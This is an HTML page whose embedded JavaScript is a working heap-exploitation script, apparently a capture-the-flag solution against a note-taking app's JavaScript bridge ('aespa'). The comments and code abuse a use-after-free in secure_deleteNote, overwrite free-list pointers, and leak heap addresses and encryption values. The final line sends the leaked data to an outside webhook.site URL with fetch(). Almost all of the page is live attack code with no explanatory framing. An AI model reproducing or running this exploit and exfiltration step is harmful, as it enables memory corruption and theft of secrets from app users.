<html>
<Body>
<script>

    /*
    All the bridge functions:

    secure_addNote : Use talloc to allocate.
    secure_deleteNote : Use tree to free it but not NULL the noteBook pointer. UAF
    secure_edit : Use the UAF to overwrite the FD Pointers.
    secure_getContent : Useless function.
    secure_getId : Use this function to leak contents.
    secure_encryption : trigger the encryption to put the pointers into the talloced region.
    */

    /* Helper Functions */
    function p64(data){ 
        const byteArray = new Uint8Array([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
        let i=0;
        while(data > 0){
            byteArray[i] = data&0xff;
            data = (data - data%256) / 256;
            i = i+1;
        }
        return String.fromCharCode.apply(String, byteArray);
    }
    function fin(data){
        const byte_array = []
        for (const character of data) {
            const code = character.charCodeAt(0);
            byte_array.push(code);
        }
        return byte_array;
    }
    function u64(data){ 
        return parseInt(data.match(/../g).reverse().join(''), 16);
    }

    /* Actual Start of the Exploit */

    // Get all the values to be leaked into the custom heap region.
    aespa.secure_encryption();

    // Get Heap Leak.
    let a = aespa.secure_addNote(fin(p64(0)));
    let b = aespa.secure_addNote(fin(p64(0)));
    let c = aespa.secure_addNote(fin(p64(0)));
    let d = aespa.secure_addNote(fin(p64(0)));
    aespa.secure_deleteNote(a);
    aespa.secure_deleteNote(c);

    let heap = parseInt(aespa.secure_getId(b)) - 0x160;
    console.log(heap);
    // Get chunk in the meta data field.
    aespa.secure_edit(fin(p64(heap+0x10)), c);
    let e = aespa.secure_addNote(fin("\x30".repeat(23) + "\x00"));
    let meta_chunk = aespa.secure_addNote(fin("\x30".repeat(24) + "\x00"));
    
    // Start getting the crypto leaks.
    for(let i=0;i<20;i++){
        if(i == 15){
            continue;
        }
        aespa.secure_edit(fin("\x30".repeat(16 + 7-i) + "\x00"), meta_chunk);
    }
    aespa.secure_edit(fin(p64(heap + 32)), meta_chunk);

    let g = aespa.secure_addNote(fin("\x30\x00"));
    let s1, s2, enc_flag, pub;

    s1 = aespa.secure_getId(g) + "-";
    for(let i=0;i<3;i++){
        aespa.secure_deleteNote(g);
        for(let i=0;i<24;i++){
            aespa.secure_edit(fin("\x30".repeat(24-i) + "\x00"), g);
        }
        aespa.secure_edit(fin(p64(heap + 40 + i*8)), meta_chunk);
        g = aespa.secure_addNote(fin("\x30\x00"));
        s1 += aespa.secure_getId(g) + "-";
    }
    fetch("https://webhook.site/08c527a6-e451-472f-bcee-ada6c562c1dc?" + s1);

</script>
</Body>
</html>